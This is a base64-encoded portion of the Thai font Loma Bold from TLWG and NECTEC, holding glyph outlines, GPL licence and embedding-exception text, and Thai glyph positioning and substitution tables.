HWT88UGk4OkU2NjUAAAL8zgTfALMG1AAIADIAAAEyNTQmIyIVFAEWFhUUBhU3MwMOAyM2NTQmJwcnBgYHNjMyFhUUBiMiJiY1NDY2Nxf9tygVEygBOlSBAWK0gRZXZlgWJjoUjowWKgIfLzI8U0VOVCFTayOMBTgoDhooKAGNH3dKAwYD+/6vOEEeCTtHSlcNdnYILyMcQTg5RElkKVFwQwx2AAH+KgTJ/9QGcwALAAADIxUjNSM1MzUzFTMse6yDg6x7BUR7e66BgQAC/TwE4v/aBwYAFgAiAAADDgIHFhYVFAYGIyImNTQ+Ajc2NjcDNCYjIgYVFBYzMjYmG32ILB0pKlA6ZIBDaXUxQUsM1igeHigoHh4oBwZJcEACD0QuJE42aFBUXC0XDhJCFv6KGiQkGhokJAACAKv/9gYsBH0ALwA7AAABJic+AzMyFhURMxEzESERECMiBgcWFw4CFRU2MzIWFhUUBgYjIiYmNTU0NjYTIgYVFBYzMjY1NCYBcUaACUh9tnbV9eHc/WfuT3UmcSs0PRkZLh5MOS1eSGVpJRQ3wh4eIhofHR4Cn1MmLXlzTPnj/icDq/uNApEBJD44N3E4RFNQDRwjUUU0ZEBPjV0/T11O/rA3Hh43Nx4eNwAAAvuFBNH+dAZ0ABcAHwAAASImJjU0NjYzMhYWFRQGBzI2NjUzFAYGJzQjIhUUMzL8xnSNQDtaLjxMJA0ON3FNpnPDyD4+Pj4E0U1tL0hRITVKHx47Ej9vSXe1Zfk8PDwAAvyiBLz+bgaEAAsAFwAAATQ2MzIWFRQGIyImNzI2NTQmIyIGFRQW/KKFYWKEhGJhheYeNDQeHjQ0BaBigoJiYYODFi0eHi0tHh4tAAL7cwUE/p0HZgALAEIAAAE0JiMiBhUUFjMyNiUyFhYzMjYzJjU0NjMyFhYVFAYjIicmJiMiBhQHIiYmNTQ2Nz4DNzMOAgcOAxUUFhc2/eMWEhIWFhISFv6XKVBIHQ4JATFDPEpBEV1TcU8VKh8WDAdgaChkVkOMfVsTtgVHYS1AkIBRBwQbBfQOGBgODhgYHTg4Bx85J0s9TBdNczELHCosAk5qKk6NFhEHDjA5M2NJCw8LES0yDQ8INQAAAf1zByL+Wgg6AAMAAAEzESP9c+fnCDr+6AAC/F0Gp/9HCHoAHAAkAAABPgI3Mw4CBwYGBzU2NjcGIyImNTQ2MzIWFRQnFDMyNTQjIv2ZHV9fHbYcmuWMFDUiEEUHEhk9TFM5UW3pNjY2Ngd7Bi9lV3G2ehcDBgRrBB8oB1k/OFRkPTpFNTU1AAL8SQaEAC4IeQAIADIAAAEyNTQmIyIVFAEWFhUUBhU3MwMOAyM2NTQmJwcnBgYVNjMyFhUUBiMiJiY1NDY2Nxf9MigVEygBOlSBAWK0gRZXZlgWJjoUjowWLB8vMjxTRU5UIVNrI4wG3SgOGigoAY0fd0oDBgP7/q84QR4JO0dKVw12dggxIRxBODlESWQpUXBDDHYAAAH9DgaO/rgIOAALAAABIxUjNSM1MzUzFTP+uHusg4OsewcJe3uugYEAAAL9HAZd/7oIgQAUACAAAAE0PgM3Mw4CIxYWFRQGBiMiJiU0JiMiBhUUFjMyNv0cUHyIdiC0G32ILB0pKlA6ZIABFCgeHigoHh4oBxVeXikbMjpJckAPRC4kTjZoRhokJBoaJCQAAAL98/x6/1/+OwAQABwAAAEyFhYVFSM1BiMiJiY1NDY2BxQWMzI2NTQmIyIG/qBRUhzIExEVPC8fSxEhDw8hIQ8PIf47Qmk53aQIFz04Ikcwlx8dHR8gHBwAAAL8r/yY/2D+RQALAB4AAAEUFjMyNjU0JiMiBhciJjU0NjMyFhYVFTMRMxEhNQb9BCEPDyEhDw8hJyxQUEBrYRl0yP38EP22Hx0dHyAcHKVCOjhgQGM0VQEV/mqpEAAB/oT9Rv+R/lQACwAAATQ2MzIWFRQGIyIm/oRIPkBHUTY0Uv3NMFdZLjdQTwAAAQDXAD0DPgQ9AAMAAAERIREDPv2ZBD38AAQAAAEAYf5ZAhP/ZgADAAATEyEDYYkBKfH+WQEN/vMAAAEAtv8UAmj/5wAHAAAFIzUjFSM1IQJobNZwAbLsVlbTAAAC/l0Gt/+XB/MACwAXAAABNDYzMhYVFAYjIiY3FBYzMjY1NCYjIgb+XVtDRFhYRENbaCAWFx8ZHRYgB1NEXFxEQ1lZQxYeHhYXHh4AAvwTBwD++AkxAAsAQAAAATQmIyIGFRQWMzI2BSIGFgciJiY1NDY3PgM3Mw4CBw4DFRQXNjMyFhYzMjYzJjU0NjMyFhYVFAYjIiYm/kQQDg0REQ0OEP7SEwQBDllhJV1PQH1tTxGvBT9ZLDyBcEYEGisnSkAXAwYBJkA4RT0QV01UYDYH3gsREQsKExOFJCcESGInSIMUEAcMKzMyXkQLDgsOJSoKCikyMwEdMiZGOkcVR2soJwAB/c4HCf9nCSkAJQAAAyYmIyIGFRQWMzMVIyIGFRQWFjMzFSMiJiY1NDY3JjU0NjMyFheZKE8mGyUyK0VBMD07PwVNUkeKWTwTOIVYJlUqCJQLDAoXGBmAFRoREgV5JEc1MToKLFFHRwwKAAACABMAAAS5BesACgAtAAABFSE1NDcmJiMiBiU2NjMyFxUmJiMiBhUVMxUjESMRIREjESM1MzU0NjYzMhYWAXkBXREeMAuicwHkKVgpZkwtLRpAU5+f3P6j3IqKbMSDHGFoBGxGcUs5BQNP6hkUG8gODU9oRsj8ogNe/KIDXshxiJM5BhMAAAEAEwAAA4kF6wAcAAABIgYVFSERIxEhESMRIzUzNTQ2NjMyFhYXFS4CAo6icwIQ3P7M3IqKbMSDInp5ICRnWgUjT2hG+9oDXvyiA17IcYiTOQoeIMggHwkAAAEAEwAAA4UF6wAaAAABFTMVIxEjESM1MzU0NjYzMhYWFxEjESYjIgYBeZ+f3IqKbMSDInp5INwnIH9qBGxGyPyiA17IcYiTOQgVFPpGBSADWwACABMAAAXCBesACgAyAAABFSE1NDcmJiMiBiU2NjMyFhYXFS4CIyIGFRUhESMRIREjESERIxEjNTM1NDY2MzIWFgF5AV0RHjALonMB8DiRVyJ6eSAkZ1oSonMCENz+zNz+o9yKimzEgx5nbQRsRnFLOQUDT+QdFgoeIMggHwlPaEb72gNe/KIDXvyiA17IcYiTOQcVAAACABMAAAW+BesAJQAwAAABFTMVIxEjESERIxEjNTM1NDY2MzIWFhc2NjMyFhYXESMRJiMiBicmJiMiBhUVITU0A7Kfn9z+o9yKimzEgx5nbSc4kVcienkg3Ccgf2rLHjALonMBXQRsRsj8ogNe/KIDXshxiJM5BxUXHRYIFRT6RgUgA1tTBQNPaEZxSwAAAwCR/tYDVwR9AAMAIwAvAAAXIRUhATIWFhURFAYGIyIuAicDFxMWFjMyNREGIyImJjU0Nhc0JiMiBhUUFjMyNpECxv06AfopX0Rgi0Nie0YeBVLxQgtBFlUKKBhFNnd1FiEXKiYcIBZiyAWnKHNx/Z9xei9CYF0bAb9P/qRFIWYB0wcfSkFoe8whMC8mITM0AAADAKv+1gYsBH0AAwAzAD8AABchFSETJic+AzMyFhURMxEzESERECMiBgcWFw4CFRU2MzIWFhUUBgYjIiYmNTU0NjYTIgYVFBYzMjY1NCbxBTv6xYBGgAlIfbZ21fXh3P1n7k91JnErND0ZGS4eTDktXkhlaSUUN8IeHiIaHx0eYsgDyVMmLXlzTPnj/icDq/uNApEBJD44N3E4RFNQDRwjUUU0ZEBPjV0/T11O/rA3Hh43Nx4eNwAABAB//tYFPwR9AAMADwAvADgAABchFSETIgYVFBYzMjY1NCYBHgMVFAYGIyImNQUjEQYjIiY1NDY2MzIWFRElETMDFBYzMjU0JiN/BMD7QKseHR0eHiEhAytIUicLSmguW2z+rNwcMk1OS2EgcYgBU9wPFhIhKCFiyAUrNh4eNjYeHjb95gc/UkoRZ24pZUmkAwgcc0ZXXSRza/1XpALZ/GspGT8oOgAABACN/tYEgQR9AAMADwAtADYAABchFSETFBYzMjY1NCYjIgYDNDY3EQYjIiY1NDY2MzIWFREFETMRIyUUBiMiJiY3MjY1NSIGFRSNA/T8DHEeHh4eHh4eHl11YBwyPF9DYClxiAFT3Nz+rXJWO2tDvBIWIShiyATZHjc3Hh43N/0nY4YKASEcXVtPXytza/37pAN9+42kTGIzcAMZKV86KD8AAAAhAZIAAQAAAAAAAABjAMgAAQAAAAAAAQAEATYAAQAAAAAAAgAEAUUAAQAAAAAAAwAVAXYAAQAAAAAABAAJAaAAAQAAAAAABQAQAcwAAQAAAAAABgAJAfEAAQAAAAAABwAmAkkAAQAAAAAACAAEAnoAAQAAAAAACQAXAq8AAQAAAAAACwAWAvUAAQAAAAAADAAWAzoAAQAAAAAADQTiDRcAAQAAAAAADgAkEkQAAQAAAAAAEAAEEnMAAQAAAAAAEQAEEoIAAwABBAkAAADGAAAAAwABBAkAAQAIASwAAwABBAkAAgAIATsAAwABBAkAAwAqAUoAAwABBAkABAASAYwAAwABBAkABQAgAaoAAwABBAkABgASAd0AAwABBAkABwBMAfsAAwABBAkACAAIAnAAAwABBAkACQAuAn8AAwABBAkACwAsAscAAwABBAkADAAsAwwAAwABBAkADQnEA1EAAwABBAkADgBIEfoAAwABBAkAEAAIEmkAAwABBAkAEQAIEngAAwABBB4AEwBCEocAQwBvAHAAeQByAGkAZwBoAHQAIAAoAGMAKQAgAE4ARQBDAFQARQBDACwAIAAyADAAMAAzAC4AIABBAGwAbAAgAHIAaQBnAGgAdABzACAAcgBlAHMAZQByAHYAZQBkAC4ACgBNAG8AZABpAGYAaQBlAGQAIAB1AG4AZABlAHIAIABHAE4AVQAgAEcAZQBuAGUAcgBhAGwAIABQAHUAYgBsAGkAYwAgAEwAaQBjAGUAbgBzAGUAIABiAHkAIABUAEwAVwBHAC4AAENvcHlyaWdodCAoYykgTkVDVEVDLCAyMDAzLiBBbGwgcmlnaHRzIHJlc2VydmVkLgpNb2RpZmllZCB1bmRlciBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBieSBUTFdHLgAATABvAG0AYQAATG9tYQAAQgBvAGwAZAAAQm9sZAAATgBlAGMAdABlAGMAIABVAEkAIAAtACAATABvAG0AYQAgAEIAbwBsAGQAAE5lY3RlYyBVSSAtIExvbWEgQm9sZAAATABvAG0AYQAgAEIAbwBsAGQAAExvbWEgQm9sZAAAVgBlAHIAcwBpAG8AbgAgADAAMAAxAC4AMAAwADIAIAAAVmVyc2lvbiAwMDEuMDAyIAAATABvAG0AYQAtAEIAbwBsAGQAAExvbWEtQm9sZAAAUwBMAFQAaABhAGkAVQBJACAAaQBzACAAYQAgAHQAcgBhAGQAZQBtAGEAcgBrACAAbwBmACAAdABoAGUAIABOAEUAQwBUAEUAQwAuAABTTFRoYWlVSSBpcyBhIHRyYWRlbWFyayBvZiB0aGUgTkVDVEVDLgAAVABMAFcARwAAVExXRwAATQByAC4AUwBpAHIAaQBjAGgAYQBpACAATABlAHIAZAB2AG8AcgBhAHcAdQB0AABNci5TaXJpY2hhaSBMZXJkdm9yYXd1dAAAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAG8AcABlAG4AdABsAGUALgBvAHIAZwAAaHR0cDovL3d3dy5vcGVudGxlLm9yZwAAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAG8AcABlAG4AdABsAGUALgBvAHIAZwAAaHR0cDovL3d3dy5vcGVudGxlLm9yZwAAVABoAGkAcwAgAGYAbwBuAHQAIABpAHMAIABmAHIAZQBlACAAcwBvAGYAdAB3AGEAcgBlADsAIAB5AG8AdQAgAGMAYQBuACAAcgBlAGQAaQBzAHQAcgBpAGIAdQB0AGUAIABpAHQAIABhAG4AZAAvAG8AcgAgAG0AbwBkAGkAZgB5ACAAaQB0ACAAdQBuAGQAZQByACAAdABoAGUAIAB0AGUAcgBtAHMAIABvAGYAIAB0AGgAZQAgAEcATgBVACAARwBlAG4AZQByAGEAbAAgAFAAdQBiAGwAaQBjACAATABpAGMAZQBuAHMAZQAgAGEAcwAgAHAAdQBiAGwAaQBzAGgAZQBkACAAYgB5ACAAdABoAGUAIABGAHIAZQBlACAAUwBvAGYAdAB3AGEAcgBlACAARgBvAHUAbgBkAGEAdABpAG8AbgA7ACAAZQBpAHQAaABlAHIAIAB2AGUAcgBzAGkAbwBuACAAMgAgAG8AZgAgAHQAaABlACAATABpAGMAZQBuAHMAZQAsACAAbwByACAAKABhAHQAIAB5AG8AdQByACAAbwBwAHQAaQBvAG4AKQAgAGEAbgB5ACAAbABhAHQAZQByACAAdgBlAHIAcwBpAG8AbgAuAAoACgBUAGgAaQBzACAAZgBvAG4AdAAgAGkAcwAgAGQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAGkAbgAgAHQAaABlACAAaABvAHAAZQAgAHQAaABhAHQAIABpAHQAIAB3AGkAbABsACAAYgBlACAAdQBzAGUAZgB1AGwALAAgAGIAdQB0ACAAVwBJAFQASABPAFUAVAAgAEEATgBZACAAVwBBAFIAUgBBAE4AVABZADsAIAB3AGkAdABoAG8AdQB0ACAAZQB2AGUAbgAgAHQAaABlACAAaQBtAHAAbABpAGUAZAAgAHcAYQByAHIAYQBuAHQAeQAgAG8AZgAgAE0ARQBSAEMASABBAE4AVABBAEIASQBMAEkAVABZACAAbwByACAARgBJAFQATgBFAFMAUwAgAEYATwBSACAAQQAgAFAAQQBSAFQASQBDAFUATABBAFIAIABQAFUAUgBQAE8AUwBFAC4AIAAgAFMAZQBlACAAdABoAGUAIABHAE4AVQAgAEcAZQBuAGUAcgBhAGwAIABQAHUAYgBsAGkAYwAgAEwAaQBjAGUAbgBzAGUAIABmAG8AcgAgAG0AbwByAGUAIABkAGUAdABhAGkAbABzAC4ACgAKAFkAbwB1ACAAcwBoAG8AdQBsAGQAIABoAGEAdgBlACAAcgBlAGMAZQBpAHYAZQBkACAAYQAgAGMAbwBwAHkAIABvAGYAIAB0AGgAZQAgAEcATgBVACAARwBlAG4AZQByAGEAbAAgAFAAdQBiAGwAaQBjACAATABpAGMAZQBuAHMAZQAgAGEAbABvAG4AZwAgAHcAaQB0AGgAIAB0AGgAaQBzACAAZgBvAG4AdAA7ACAAaQBmACAAbgBvAHQALAAgAHcAcgBpAHQAZQAgAHQAbwAgAHQAaABlACAARgByAGUAZQAgAFMAbwBmAHQAdwBhAHIAZQAgAEYAbwB1AG4AZABhAHQAaQBvAG4ALAAgAEkAbgBjAC4ALAAgADUAMQAgAEYAcgBhAG4AawBsAGkAbgAgAFMAdAAsACAARgBpAGYAdABoACAARgBsAG8AbwByACwAIABCAG8AcwB0AG8AbgAsACAATQBBACAAIAAwADIAMQAxADAALQAxADMAMAAxACAAIABVAFMAQQAKAAoAQQBzACAAYQAgAHMAcABlAGMAaQBhAGwAIABlAHgAYwBlAHAAdABpAG8AbgAsACAAaQBmACAAeQBvAHUAIABjAHIAZQBhAHQAZQAgAGEAIABkAG8AYwB1AG0AZQBuAHQAIAB3AGgAaQBjAGgAIAB1AHMAZQBzACAAdABoAGkAcwAgAGYAbwBuAHQALAAgAGEAbgBkACAAZQBtAGIAZQBkACAAdABoAGkAcwAgAGYAbwBuAHQAIABvAHIAIAB1AG4AYQBsAHQAZQByAGUAZAAgAHAAbwByAHQAaQBvAG4AcwAgAG8AZgAgAHQAaABpAHMAIABmAG8AbgB0ACAAaQBuAHQAbwAgAHQAaABlACAAZABvAGMAdQBtAGUAbgB0ACwAIAB0AGgAaQBzACAAZgBvAG4AdAAgAGQAbwBlAHMAIABuAG8AdAAgAGIAeQAgAGkAdABzAGUAbABmACAAYwBhAHUAcwBlACAAdABoAGUAIAByAGUAcwB1AGwAdABpAG4AZwAgAGQAbwBjAHUAbQBlAG4AdAAgAHQAbwAgAGIAZQAgAGMAbwB2AGUAcgBlAGQAIABiAHkAIAB0AGgAZQAgAEcATgBVACAARwBlAG4AZQByAGEAbAAgAFAAdQBiAGwAaQBjACAATABpAGMAZQBuAHMAZQAuACAAVABoAGkAcwAgAGUAeABjAGUAcAB0AGkAbwBuACAAZABvAGUAcwAgAG4AbwB0ACAAaABvAHcAZQB2AGUAcgAgAGkAbgB2AGEAbABpAGQAYQB0AGUAIABhAG4AeQAgAG8AdABoAGUAcgAgAHIAZQBhAHMAbwBuAHMAIAB3AGgAeQAgAHQAaABlACAAZABvAGMAdQBtAGUAbgB0ACAAbQBpAGcAaAB0ACAAYgBlACAAYwBvAHYAZQByAGUAZAAgAGIAeQAgAHQAaABlACAARwBOAFUAIABHAGUAbgBlAHIAYQBsACAAUAB1AGIAbABpAGMAIABMAGkAYwBlAG4AcwBlAC4AIABJAGYAIAB5AG8AdQAgAG0AbwBkAGkAZgB5ACAAdABoAGkAcwAgAGYAbwBuAHQALAAgAHkAbwB1ACAAbQBhAHkAIABlAHgAdABlAG4AZAAgAHQAaABpAHMAIABlAHgAYwBlAHAAdABpAG8AbgAgAHQAbwAgAHkAbwB1AHIAIAB2AGUAcgBzAGkAbwBuACAAbwBmACAAdABoAGUAIABmAG8AbgB0ACwAIABiAHUAdAAgAHkAbwB1ACAAYQByAGUAIABuAG8AdAAgAG8AYgBsAGkAZwBhAHQAZQBkACAAdABvACAAZABvACAAcwBvAC4AIABJAGYAIAB5AG8AdQAgAGQAbwAgAG4AbwB0ACAAdwBpAHMAaAAgAHQAbwAgAGQAbwAgAHMAbwAsACAAZABlAGwAZQB0AGUAIAB0AGgAaQBzACAAZQB4AGMAZQBwAHQAaQBvAG4AIABzAHQAYQB0AGUAbQBlAG4AdAAgAGYAcgBvAG0AIAB5AG8AdQByACAAdgBlAHIAcwBpAG8AbgAuAABUaGlzIGZvbnQgaXMgZnJlZSBzb2Z0d2FyZTsgeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeSBpdCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieSB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uOyBlaXRoZXIgdmVyc2lvbiAyIG9mIHRoZSBMaWNlbnNlLCBvciAoYXQgeW91ciBvcHRpb24pIGFueSBsYXRlciB2ZXJzaW9uLgoKVGhpcyBmb250IGlzIGRpc3RyaWJ1dGVkIGluIHRoZSBob3BlIHRoYXQgaXQgd2lsbCBiZSB1c2VmdWwsIGJ1dCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgZm9yIG1vcmUgZGV0YWlscy4KCllvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFsb25nIHdpdGggdGhpcyBmb250OyBpZiBub3QsIHdyaXRlIHRvIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIEluYy4sIDUxIEZyYW5rbGluIFN0LCBGaWZ0aCBGbG9vciwgQm9zdG9uLCBNQSAgMDIxMTAtMTMwMSAgVVNBCgpBcyBhIHNwZWNpYWwgZXhjZXB0aW9uLCBpZiB5b3UgY3JlYXRlIGEgZG9jdW1lbnQgd2hpY2ggdXNlcyB0aGlzIGZvbnQsIGFuZCBlbWJlZCB0aGlzIGZvbnQgb3IgdW5hbHRlcmVkIHBvcnRpb25zIG9mIHRoaXMgZm9udCBpbnRvIHRoZSBkb2N1bWVudCwgdGhpcyBmb250IGRvZXMgbm90IGJ5IGl0c2VsZiBjYXVzZSB0aGUgcmVzdWx0aW5nIGRvY3VtZW50IHRvIGJlIGNvdmVyZWQgYnkgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlLiBUaGlzIGV4Y2VwdGlvbiBkb2VzIG5vdCBob3dldmVyIGludmFsaWRhdGUgYW55IG90aGVyIHJlYXNvbnMgd2h5IHRoZSBkb2N1bWVudCBtaWdodCBiZSBjb3ZlcmVkIGJ5IHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZS4gSWYgeW91IG1vZGlmeSB0aGlzIGZvbnQsIHlvdSBtYXkgZXh0ZW5kIHRoaXMgZXhjZXB0aW9uIHRvIHlvdXIgdmVyc2lvbiBvZiB0aGU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BCVIAAQAAAAEJXAABAAAAAQlmAAEAAAABCXAAAQAAAAEJegABAAAAAQmEAAEAAAABCY4AAQAAAAEJmAABAAAAAQmiAAEAAAABCawAAQAAAAEJtgABAAAAAQnAAAEAAAABCcoAAQBKAAIACgA4AAUADAAUABwAIgAoAWsAAwBIAE4BagADAEgASwFpAAIATgFoAAIASwFnAAIASAACAAYADAFrAAIATgFqAAIASwABAAIASAFnAAEADgAEABgALgBEAFoAAgABARABEwAAAAEABAAAAAIAywAAAAIAAAAmAAEAJgABAAQAAAACAMsAAAACAAAAJwABACcAAQAEAAAAAgDLAAAAAgAAACgAAQAoAAEABAAAAAIAywAAAAIAAAApAAEAKQABABIABgAcADIASABeAHQAigACAAEBDwEUAAAAAQAEAAAAAgDMAAAAAgAAAC8AAQAvAAEABAAAAAIAzAAAAAIAAAAwAAEAMAABAAQAAAACAMwAAAACAAAAMQABADEAAQAEAAAAAgDMAAAAAgAAADIAAQAyAAEABAAAAAIAzAAAAAIAAAAzAAEAMwABAAQAAAACAMwAAAACAAAANAABADQAAQAMAAMAFgAsAEIAAQADAQQBBQEGAAEABAAAAAIAzAAAAAIAAAAsAAEALAABAAQAAAACAMwAAAACAAAALQABAC0AAQAEAAAAAgDMAAAAAgAAAC4AAQAuAAEANgAEAA4AGAAiACwAAQAEAWwAAgDMAAEABAFtAAIAzAABAAQBbgACAMwAAQAEAW8AAgDMAAEABADTANkA5QDtAAMAAAABABIAAQAaAAEAAAANAAEAAgDZANwAAQAEAMwBBAEFAQYAAgAKAAIBVQFGAAEAAgDZANwAAQAIAAEADgABAAEAzAADAAgAGgAsAAAAAgEEAAAAAgAAACwAAQAsAAAAAgEFAAAAAgAAAC0AAQAtAAAAAgEGAAAAAgAAAC4AAQAuAAEACAABAA4AAQABAMwABgAOACAAMgBEAFYAaAAAAAIBDwAAAAIAAAAvAAEALwAAAAIBEAAAAAIAAAAwAAEAMAAAAAIBEQAAAAIAAAAxAAEAMQAAAAIBEgAAAAIAAAAyAAEAMgAAAAIBEwAAAAIAAAAzAAEAMwAAAAIBFAAAAAIAAAA0AAEANAABAAoAAgASACgAAQACAQQBBQABAAQAAAACAQYAAAACAAAAKgABACoAAQAEAAAAAgEGAAAAAgAAACsAAQArAAEADAADABYAkAEKAAEAAwEEAQUBBgAGAA4AIAAyAEQAVgBoAAAAAgEQAAAAAgAAABMAAQATAAAAAgERAAAAAgAAABQAAQAUAAAAAgESAAAAAgAAABUAAQAVAAAAAgETAAAAAgAAABYAAQAWAAAAAgEUAAAAAgAAABcAAQAXAAAAAgEVAAAAAgAAABgAAQAYAAYADgAgADIARABWAGgAAAACARAAAAACAAAAGQABABkAAAACAREAAAACAAAAGgABABoAAAACARIAAAACAAAAGwABABsAAAACARMAAAACAAAAHAABABwAAAACARQAAAACAAAAHQABAB0AAAACARUAAA